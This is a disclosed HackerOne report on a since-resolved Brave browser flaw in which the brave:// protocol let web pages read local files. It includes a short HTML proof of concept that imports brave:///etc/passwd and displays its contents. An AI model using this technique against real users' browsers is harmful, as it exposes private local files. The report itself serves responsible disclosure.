# Local files reading from the web using `brave://`

## Metadata

- HackerOne Report ID: 390013
- Weakness: 
- Program: brave
- Disclosed At: 2018-09-25T00:05:47.401Z
- Has Bounty: Yes

- Substate: resolved

## Original Report

## Summary:

`brave://` protocol was introduced as a replacement for `AsarProtocolHandler`(or something like that) in `brave/muon` after #375329. 

However, fix for #375329 introduced a new much severe bug that allows reading files from a user's device from the web.

PoC is similar to #375329, but it uses `brave://` instead of `file://`:
```
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="brave:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```

V8: 6.8.275.24 
rev: 50bdb6df42550dd14f5636770ec8585aa26e361b 
Muon: 8.0.3

OS Architecture: x64 
OS Platform: macOS

## Steps To Reproduce:

1. Open `exploit.html` from the web
2. Page alerts contents of `file:///etc/passwd`

## Supporting Material

Screencast attached.

## Impact

Reading local files from the web is a critical vulnerability.
I'm investigating this issue more detailed now, maybe impact is much severe than reading local files.
